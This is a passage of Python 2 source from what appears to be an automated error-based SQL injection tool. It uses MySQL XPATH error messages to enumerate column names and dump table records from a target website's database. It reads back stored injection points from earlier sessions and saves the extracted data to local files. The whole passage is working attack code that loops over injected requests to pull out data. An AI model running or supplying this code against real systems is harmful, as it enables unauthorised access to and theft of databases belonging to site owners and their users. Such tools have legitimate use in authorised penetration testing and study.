                                                                        try:
                                                                            req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=10)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            pass
                                                                        except KeyboardInterrupt:
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    dbvul = True
                                                                                    DbDumpQuery = FinalDumpQuery_replaced
                                                                                    temp = 0
                                                                                    noc = int(no_of_cols)
                                                                                    infos += "Database: %s\n" % db
                                                                                    infos += "Table: %s\n" % tbl
                                                                                    infos += "["+str(noc)+" columns]\n"
                                                                                    #tmp = ""
                                                                                    while temp < noc:
                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                        elif 'LIMIT%20' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                                        else:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)

                                                                                        try:
                                                                                            req = Request(url, data=tempQuery, headers={'User-agent':ua})
                                                                                            resp = urlopen(req, timeout=10)
                                                                                        except URLError as e:
                                                                                            URLError()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except HTTPError as e:
##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except (IOError, httplib.HTTPException) as e:
                                                                                            ConnTimeOut()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            pass
                                                                                        except KeyboardInterrupt:
                                                                                            print fg + sb + "Database: %s" % db
                                                                                            print fg + sb + "Table: %s" % tbl
                                                                                            print fg + sb + "[Dumped "+str(temp)+" columns]"
                                                                                            #print fg + sb + tmp
                                                                                            col = pt(["columns"])
                                                                                            col.align = "l"
                                                                                            col.header = False
                                                                                            for cols in dumps:
                                                                                                col.add_row([cols])
                                                                                                pass
                                                                                            print fg + sn + str(col)
                                                                                            f.write(infos)
                                                                                            f.write(str(col)+"\n")
                                                                                            f.close()
                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                                            KeyBoardInterrupt()
                                                                                            break
                                                                                        else:
                                                                                            try:
                                                                                                respdata = resp.read()
                                                                                                name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                if 'XPATH syntax error' in respdata:
                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
                                                                                                    #infos += "[*] %s\n" % name_of_cols
                                                                                                    #tmp += "[*] %s\n" % name_of_cols
                                                                                                    dumps.append(name_of_cols)
                                                                                                    temp += 1
                                                                                                    
                                                                                            except IndexError as e:
                                                                                                pass
                                                                                            except Exception as e:
                                                                                                #print '[-] %s' % e
                                                                                                #sys.exit(0)
                                                                                                pass
                                                                                            except KeyboardInterrupt:
                                                                                                KeyBoardInterrupt()
                                                                                                break
                                                                                    print fg + sb + "Database: %s" % db        
                                                                                    print fg + sb + "Table: %s" % tbl
                                                                                    print fg + sb + "["+str(noc)+" columns]"
                                                                                    #print fg + sb + tmp
                                                                                    col = pt(["columns"])
                                                                                    col.align = "l"
                                                                                    col.header = False
                                                                                    for cols in dumps:
                                                                                        col.add_row([cols])
                                                                                        pass
                                                                                    print fg + sn + str(col)
                                                                                        
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                #print '[-] %s' % e
                                                                                #sys.exit(0)
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                if dbvul:
                                                                    break
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.write(str(col)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
            for QueryIndex in COL_COUNT_FROM_TBL:
                if not Query_Test:
                   #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                    QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
                                    dbvul = False
                                    for QueryIndex in COL_DUMP_FROM_TBL:
                                        if not dbvul:
                                            #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                            QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
                                            if '0x72306f74' in tempfread:
                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            dbvul = True
                                                            DbDumpQuery = FinalCountQuery_replaced
                                                            temp = 0
                                                            noc = int(no_of_cols)
                                                            infos += "Database: %s\n" % db
                                                            infos += "Table: %s\n" % tbl
                                                            infos += "["+str(noc)+" columns]\n"
                                                            #tmp = ""
                                                            while temp < noc:
                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                elif 'LIMIT%20' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
                                                                else:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                
                                                                try:
                                                                    req = Request(url, data=tempQuery, headers={'User-agent':ua})
                                                                    resp = urlopen(req, timeout=10)
                                                                except URLError as e:
                                                                    URLError()
                                                                    if temp==0:
                                                                        temp=0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except HTTPError as e:
##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                    sleep(1)
                                                                    pass
                                                                except (IOError, httplib.HTTPException) as e:
                                                                    ConnTimeOut()
                                                                    if temp==0:
                                                                        temp=0
                                                                    else:
                                                                        temp = temp
                                                                    pass
                                                                except KeyboardInterrupt:
                                                                    print fw + sn + "Database: %s" % db
                                                                    print fw + sn + "Table: %s" % tbl
                                                                    print fw + sn + "[Dumped "+str(temp)+" columns]"
                                                                    #print fw + sn + tmp
                                                                    col = pt(["columns"])
                                                                    col.align = "l"
                                                                    col.header = False
                                                                    for cols in dumps:
                                                                        col.add_row([cols])
                                                                        pass
                                                                    print fw + sn + str(col)
                                                                    f.write(infos)
                                                                    f.write(str(col)+"\n")
                                                                    f.close()
                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                    KeyBoardInterrupt()
                                                                    break
                                                                else:
                                                                    try:
                                                                        respdata = resp.read()
                                                                        name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                        if 'XPATH syntax error' in respdata:
                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
                                                                            #infos += "[*] %s\n" % name_of_cols
                                                                            #tmp += "[*] %s\n" % name_of_cols
                                                                            dumps.append(name_of_cols)
                                                                            temp += 1
                                                                            
                                                                    except IndexError as e:
                                                                        pass
                                                                    except Exception as e:
                                                                        #print '[-] %s' % e
                                                                        #sys.exit(0)
                                                                        pass
                                                                    except KeyboardInterrupt:
                                                                        KeyBoardInterrupt()
                                                                        break
                                                                
                                                            print fw + sn + "Database: %s" % db
                                                            print fw + sn + "Table: %s" % tbl
                                                            print fw + sn + "["+str(noc)+" columns]"
                                                            #print fw + sn + tmp
                                                            col = pt(["columns"])
                                                            col.align = "l"
                                                            col.header = False
                                                            for cols in dumps:
                                                                col.add_row([cols])
                                                                pass
                                                            print fw + sn + str(col)
                                                                
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if dbvul:
                                            break
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                #sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.write(str(col)+"\n")
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
            
    else:
        pass



def dumpTblRecords(url, data, db, tbl, col):
    
    global war,wsr
    global logs,payload
    global PathToDumpedDb,PathToDumpedTbl
    HTTPReqCount = 0
    ColumnList = ()
    recs = []
    infos = ""
    dumps = ""
#------------------------------------------
    f = open(logs,'a')
    fd = open(PathToDumpedTbl,'a')
#------------------------------------------
#------------------------------------------------------------------------------------------------------------------#
#                                           GET DATA INJECTION                                                     #
#------------------------------------------------------------------------------------------------------------------#
    if url != None and data == None:
        ColumnList = (col)
        try:
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                            else:
                                tgt = url + temp
                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    out = ', '.join(map(str,ColumnList))
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
                                    for QueryIndex in REC_COUNT_FROM_TBL:
                                        if not Query_Test:
                                            QueryToTest = QueryIndex % (db,tbl)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            if '0' in no_of_recs:
                                                                print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                                                break
                                                            else:
                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                                                dbvul = False
                                                                for QueryIndex in REC_DUMP_FROM_TBL:
                                                                    if not dbvul:
                                                                        QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
                                                                        if '0x72306f74' in tgt:
                                                                            FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                                            try:
                                                                                req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                                                resp = urlopen(req, timeout=10)
                                                                            except URLError as e:
                                                                                URLError()
                                                                                sleep(1)
                                                                                pass
                                                                            except HTTPError as e:
    ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                sleep(1)
                                                                                pass
                                                                            except (IOError, httplib.HTTPException) as e:
                                                                                ConnTimeOut()
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                            else:
                                                                                try:
                                                                                    respdata = resp.read()
                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                    if 'XPATH syntax error' in respdata:
                                                                                        dbvul = True
                                                                                        if '%20' in FinalDumpQuery_replaced:
                                                                                            testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
                                                                                        else:
                                                                                            testQuery = FinalDumpQuery_replaced
                                                                                        
                                                                                        if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
                                                                                            DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')

                                                                                        elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
                                                                                            DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
                                                                                            
                                                                                        else:
                                                                                            pass
                                                                                        
                                                                                        temp = 0
                                                                                        nor = int(no_of_recs)
                                                                                        infos += "Database: %s\n" % db
                                                                                        infos += "Table: %s\n" % tbl
                                                                                        infos += "["+str(nor)+" recs]\n"
                                                                                        tmp = ""
                                                                                        while temp < nor:
                                                                                            t = 0
                                                                                            for columns in ColumnList:
                                                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                                elif 'LIMIT%%20' in DbDumpQuery:
                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
                                                                                                else:
                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                                                    
                                                                                                if 'LIMIT%20' in tempQuery:
                                                                                                    tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
                                                                                                else:
                                                                                                    tempQuery = tempQuery
                                                                                                    
                                                                                                RecordsnumpQuery = tempQuery % (columns)
                                                                                                try:
                                                                                                    req = Request(RecordsnumpQuery, headers={'User-agent':ua})
                                                                                                    resp = urlopen(req, timeout=30)
                                                                                                except URLError as e:
                                                                                                    URLError()
                                                                                                    if temp == 0:
                                                                                                        temp = 0
                                                                                                    else:
                                                                                                        temp = temp
                                                                                                    sleep(1)
                                                                                                    pass
                                                                                                except HTTPError as e:
    ##                                                                                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                                    sleep(1)
                                                                                                    pass
                                                                                                except (IOError, httplib.HTTPException) as e:
                                                                                                    ConnTimeOut()
                                                                                                    if temp == 0:
                                                                                                        temp = 0
                                                                                                    else:
                                                                                                        temp = temp
                                                                                                    pass
                                                                                                except KeyboardInterrupt:
                                                                                                    print fg + sb + "Database: %s" % db
                                                                                                    print fg + sb + "Table: %s" % tbl
                                                                                                    print fg + sb + "[Dumped "+str(temp)+" records]:"
                                                                                                    print fg + sb + tmp
                                                                                                    fd.write(dumps)
                                                                                                    fd.close()
                                                                                                    f.write(infos)
                                                                                                    f.close()
                                                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                                                                                                    KeyBoardInterrupt()
                                                                                                    break
                                                                                                else:
                                                                                                    try:
                                                                                                        respdata = resp.read()
                                                                                                        records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                        if 'XPATH syntax error' in respdata:
                                                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
                                                                                                            infos += "[*] %s\n" % records
                                                                                                            dumps += "{},".format(records)
                                                                                                            tmp += "[*] %s\n" % records
                                                                                                            t += 1
                                                                                                            
                                                                                                    except IndexError as e:
                                                                                                        pass
                                                                                                    except Exception as e:
                                                                                                        pass
                                                                                                    except KeyboardInterrupt:
                                                                                                        KeyBoardInterrupt()
                                                                                                        break  
                                                                                            check = len(ColumnList)
                                                                                            if t == check:
                                                                                                dumps += "\n"
                                                                                                temp += 1
                                                                                            else:
                                                                                                pass

                                                                                        print fg + sb + "Database: %s" % db
                                                                                        print fg + sb + "Table: %s" % tbl
                                                                                        print fg + sb + "["+str(nor)+" records]"
                                                                                        print fg + sb + tmp
                                                                                            
                                                                                except IndexError as e:
                                                                                    pass
                                                                                except Exception as e:
                                                                                    pass
                                                                                except KeyboardInterrupt:
                                                                                    KeyBoardInterrupt()
                                                                                    break
                                                                    if dbvul:
                                                                        break
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
            f.write(infos)
            fd.write(dumps)
            fd.close()
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            out = ', '.join(map(str,ColumnList))
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
            for QueryIndex in REC_COUNT_FROM_TBL:
                if not Query_Test:
                    QueryToTest = QueryIndex % (db,tbl)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    if '0' in no_of_recs:
                                        print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                        break
                                    else:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
                                        dbvul = False
                                        for QueryIndex in REC_DUMP_FROM_TBL:
                                            if not dbvul:
                                                QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
                                                if '0x72306f74' in tempfread:
                                                    FinalDumpQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                    try:
                                                        req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                        resp = urlopen(req, timeout=10)
                                                    except URLError as e:
                                                        URLError()
                                                        sleep(1)
                                                        pass
                                                    except HTTPError as e:
    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                        sleep(1)
                                                        pass
                                                    except (IOError, httplib.HTTPException) as e:
                                                        ConnTimeOut()
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                                    else:
                                                        try:
                                                            respdata = resp.read()
                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                            if 'XPATH syntax error' in respdata:
                                                                dbvul = True
                                                                if '%20' in FinalDumpQuery_replaced:
                                                                    testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
                                                                else:
                                                                    testQuery = FinalDumpQuery_replaced
                                                                
                                                                if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
                                                                    DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')

                                                                elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
                                                                    DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
                                                                    
                                                                else:
                                                                    pass
                                                                
                                                                temp = 0
                                                                nor = int(no_of_recs)
                                                                infos += "Database: %s\n" % db
                                                                infos += "Table: %s\n" % tbl
                                                                infos += "["+str(nor)+" recs]\n"
                                                                tmp = ""
                                                                while temp < nor:
                                                                    t = 0
                                                                    for columns in ColumnList:
                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                        elif 'LIMIT%%20' in DbDumpQuery:
                                                                            tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
                                                                        else:
                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                            
                                                                        if 'LIMIT%20' in tempQuery:
                                                                            tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
                                                                        else:
                                                                            tempQuery = tempQuery
                                                                            
                                                                        RecordsnumpQuery = tempQuery % (columns)
                                                                        try:
                                                                            req = Request(RecordsnumpQuery, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=30)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            if temp == 0:
                                                                                temp = 0
                                                                            else:
                                                                                temp = temp
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
    ##                                                                        print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            if temp == 0:
                                                                                temp = 0
                                                                            else:
                                                                                temp = temp
                                                                                
                                                                        except KeyboardInterrupt:
                                                                            print fw + sn + "Database: %s" % db
                                                                            print fw + sn + "Table: %s" % tbl
                                                                            print fw + sn + "[Dumped "+str(temp)+" records]:"
                                                                            print fw + sn + tmp
                                                                            fd.write(dumps)
                                                                            fd.close()
                                                                            f.write(infos)
                                                                            f.close()
                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
                                                                                    infos += "[*] %s\n" % records
                                                                                    dumps += "{},".format(records)
                                                                                    tmp += "[*] %s\n" % records
                                                                                    rl = len (records) + 1
                                                                                    t += 1
                                                                                    
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                            
                                                                    check = len(ColumnList)
                                                                    if t == check:
                                                                        dumps += "\n"
                                                                        temp += 1
                                                                    else:
                                                                        pass
                                                                    
                                                                print fw + sn + "Database: %s" % db
                                                                print fw + sn + "Table: %s" % tbl
                                                                print fw + sn + "["+str(nor)+" records]"
                                                                print fw + sn + tmp
                                                                
                                                                    
                                                        except IndexError as e:
                                                            pass
                                                        except Exception as e:
                                                            pass
                                                        except KeyboardInterrupt:
                                                            KeyBoardInterrupt()
                                                            break
                                            if dbvul:
                                                break
                            except IndexError as e:
                                pass
                            except Exception as e:
                                pass
                            except KeyboardInterrupt:
